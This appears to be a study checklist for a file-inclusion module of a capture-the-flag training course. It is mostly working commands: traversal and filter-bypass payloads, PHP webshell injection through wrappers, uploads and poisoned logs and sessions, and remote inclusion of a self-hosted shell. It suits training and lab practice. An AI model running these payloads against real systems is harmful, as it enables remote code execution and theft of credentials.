# File Inclusion Checklist

**Module covers:** LFI | Path Traversal | Filter Bypasses | PHP Filters | PHP Wrappers | RFI | Upload+LFI | Log Poisoning | Automated Scanning

---

## Reconnaissance

- [ ] Identify file-loading parameters: `?language=`, `?page=`, `?view=`, `?file=`, `?path=`
- [ ] Get baseline page size: `curl -s "http://<TARGET>/index.php" | wc -c`
- [ ] Fuzz for hidden parameters: `ffuf -w burp-parameter-names.txt:FUZZ -u URL?FUZZ=value -fs <BASELINE>`
- [ ] Check nav links to identify approved path prefix (e.g. `languages/en.php`)
- [ ] Get failed-include size: `curl -s "http://<TARGET>/index.php?<PARAM>=nonexistent" | wc -c`

---

## Basic LFI

- [ ] Try absolute path: `?language=/etc/passwd`
- [ ] Try path traversal: `?language=../../../../etc/passwd`
- [ ] Try with approved prefix: `?language=languages/../../../../etc/passwd`
- [ ] Confirm content appears in page — check between expected HTML tags
- [ ] **Determine LFI function:** read the PHP source (see Source Disclosure section)
  - `file_get_contents()` / `readfile()` → read-only; pivot to source disclosure
  - `include()` / `require()` → executes PHP; proceed to RCE techniques

---

## Filter Bypasses

- [ ] Non-recursive removal bypass: `?language=....//....//....//....//etc/passwd`
- [ ] URL encoded: `?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- [ ] Double URL encoded: `?language=%252e%252e%252f...`
  - Use when filter checks `$_GET["param"]` (PHP-decoded) then calls `urldecode()` after
  - `%252F` → PHP decodes to `%2F` in `$_GET` → filter sees no `/` → passes → `urldecode()` → `/`
- [ ] Approved path + non-recursive: `?language=languages/....//....//....//....//etc/passwd`
- [ ] If extension appended → try `php://filter` or null byte (old PHP)

---

## Source Disclosure via Read-Only LFI

Use when LFI function is `file_get_contents()` / `readfile()` — PHP source is returned as raw text.

- [ ] Read all PHP files in the app to find `include()`/`require()` with user-controlled params:
  ```bash
  curl -s "http://<TARGET>/api/image.php?p=....//index.php"
  curl -s "http://<TARGET>/api/image.php?p=....//contact.php"
  curl -s "http://<TARGET>/api/image.php?p=....//api/application.php"
  # Repeat for every .php file found
  ```
- [ ] Read webserver config — reveals denied dirs, upload paths, PHP version:
  ```bash
  curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/nginx/sites-enabled/default"
  curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/apache2/apache2.conf"
  ```
- [ ] In upload handler source, check how files are named:
  - `md5_file($tmp_name)` → compute locally: `md5sum /tmp/shell.ext`
  - Original filename → use that in LFI path
  - Check if `include()` appends `.php` — if so, omit extension from traversal

---

## PHP Filters (Source Code Disclosure via php://filter)

- [ ] Fuzz for PHP files: `ffuf -w directory-list-2.3-small.txt:FUZZ -u URL/FUZZ.php -mc 200,301,302,403`
- [ ] Read PHP source via base64 filter (omit .php from resource name):
  ```bash
  ?language=php://filter/read=convert.base64-encode/resource=config
  ```
- [ ] Pipe through: `grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d`
- [ ] Check decoded output for: DB passwords, API keys, credentials, other file references
- [ ] Read php.ini to check `allow_url_include` and `allow_url_fopen`:
  ```bash
  ?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
  ```

---

## PHP Wrappers (RCE)

- [ ] Confirm `allow_url_include = On` from php.ini (required for data:// and php://input)
- [ ] Try `php://input`:
  ```bash
  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "URL?language=php://input&cmd=id"
  ```
- [ ] Try `data://`:
  ```bash
  ?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id
  ```
- [ ] Try `expect://` (if extension loaded):
  ```bash
  ?language=expect://id
  ```
- [ ] Confirm RCE: look for `uid=` in response
- [ ] Find flag: `cmd=find+/+-maxdepth+2+-name+'*.txt'` then `cmd=cat+/FLAGFILE`

---

## RFI

- [ ] Verify `allow_url_include = On`
- [ ] Confirm RFI: `?language=http://127.0.0.1:80/index.php` (check for recursive content)
- [ ] Create webshell: `echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php`
- [ ] Start HTTP server: `cd /tmp && python3 -m http.server <PORT> &`
- [ ] Execute: `?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id`
- [ ] Confirm `uid=` in response
- [ ] Find and read flag

---

## LFI + File Upload

- [ ] Find upload form and field name: `curl -s http://<TARGET>/apply.php | grep -i "input\|form\|name="`
- [ ] Read upload handler source to determine file naming scheme (see Source Disclosure above)
- [ ] Create malicious image (GIF8 bypasses content-type checks):
  ```bash
  echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif
  # Or use .php extension if accepted: > /tmp/shell.php
  ```
- [ ] Upload: `curl -s -F "<FIELDNAME>=@/tmp/shell.gif" "http://<TARGET>/upload.php"`
- [ ] Determine uploaded filename on server:
  - If `md5_file()`: `md5sum /tmp/shell.gif` → filename is `<hash>.gif`
  - If original name preserved: filename is `shell.gif`
  - If from response HTML: inspect `<img src="...">` or redirect URL
- [ ] If `include()` appends `.php`: use hash/name WITHOUT extension in LFI path
- [ ] Include via LFI: `?language=./profile_images/shell.gif&cmd=id`
- [ ] Confirm `GIF8uid=` in response (GIF magic bytes prepend the output)

---

## Log Poisoning

### PHP Session Poisoning
- [ ] Get PHPSESSID: `curl -s -c /tmp/cookies.txt "http://<TARGET>/index.php" > /dev/null`
- [ ] Extract: `SESSID=$(grep PHPSESSID /tmp/cookies.txt | awk '{print $NF}')`
- [ ] Poison (single quotes required): 
  ```bash
  curl -s -b /tmp/cookies.txt -G --data-urlencode 'language=<?php system($_GET["cmd"]); ?>' "URL" > /dev/null
  ```
- [ ] Include immediately after poisoning:
  ```bash
  curl -s -b /tmp/cookies.txt "URL?language=/var/lib/php/sessions/sess_$SESSID&cmd=id"
  ```
- [ ] Re-poison before EVERY subsequent command (include overwrites the session)

### Apache/Nginx Log Poisoning
- [ ] Check log readable: `?language=/var/log/apache2/access.log` → content between h2 tags?
- [ ] Check Nginx log: `?language=/var/log/nginx/access.log`
- [ ] Poison User-Agent:
  ```bash
  curl -s "http://<TARGET>/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
  ```
- [ ] Include log with cmd: `?language=/var/log/apache2/access.log&cmd=id`

### /proc/self/environ
- [ ] Single-request attack — poison and include simultaneously:
  ```bash
  curl -s "URL?language=/proc/self/environ&cmd=id" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
  ```

### /proc/self/fd/N
- [ ] Try fd files 0-50 while sending poison User-Agent:
  ```bash
  for i in $(seq 1 50); do
    result=$(curl -s "URL?language=/proc/self/fd/$i&cmd=id" -H 'User-Agent: <?php system($_GET["cmd"]); ?>' | grep -oP 'uid=\S+')
    [ -n "$result" ] && echo "fd/$i: $result" && break
  done
  ```

---

## Automated Scanning

- [ ] Get both page sizes (baseline and failed-include)
- [ ] Fuzz LFI wordlist filtering BOTH sizes:
  ```bash
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
    -u "URL?<PARAM>=FUZZ" -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s
  ```
- [ ] Fuzz server config/log paths:
  ```bash
  ffuf -w LFI-WordList-Linux:FUZZ -u "URL?<PARAM>=../../../../FUZZ" \
    -fs <BASELINE>,<FAILED_INCLUDE> -t 100 -s
  ```
- [ ] Read Apache config to find log path: `?language=../../../../etc/apache2/apache2.conf`
- [ ] Read Apache envvars to resolve `$APACHE_LOG_DIR`: `?language=../../../../etc/apache2/envvars`

---

## Output Extraction

```bash
# Flag in page HTML (between known tags — adapt tag to target app)
curl -s "URL?cmd=cat+/flag.txt" | python3 -c "import sys,re; print(re.findall(r'<p>\s*(.*?)\s*</p>', sys.stdin.read(), re.S))"

# Flag with HTB format (any position in response)
curl -s "URL?cmd=cat+/flag.txt" | grep -oP 'HTB\{[^}]+\}'

# GIF8 magic bytes prefix (upload+LFI output) — stop at whitespace/HTML
curl -s "URL?cmd=id" | grep -oP 'GIF8\K[^\s<]+'

# Session poisoning output — cmd result embedded inside serialized session string
# Output appears before: selected_language|s:N:"...cmd_output...";
curl -s "URL?language=/var/lib/php/sessions/sess_$SESSID&cmd=id" \
  | grep -oP 'uid=\d+\(\w+\)'

# Always ls / first — flags are never reliably named flag.txt
curl -s "URL?cmd=ls+/" | grep -oP '(?<=GIF8)[^\n<]+'
```

---

## Common Pitfalls

| Problem | Fix |
|---------|-----|
| `Illegal path specified!` | Approved path filter — use correct prefix from nav links |
| Empty content area on LFI | File not readable or extension appended — try php://filter |
| Session include shows path not PHP code | Session was updated before disk write — re-read session output: cmd output is embedded IN the serialized string |
| Log not readable (Apache) | Apache logs need root/adm — try Nginx or /proc/self/environ |
| ffuf shows hundreds of matches | Filtering only baseline size — also filter failed-include size |
| `data://` blocked | Try `php://input` instead |
| RFI connection refused | HTTP server not running — start it before attempting RFI |
| Upload LFI no output | File path wrong — check response HTML for `<img src="...">` |
| LFI is `file_get_contents()` but need RCE | Pivot: read all PHP source files to find `include()` LFI; read upload handler to understand file naming |
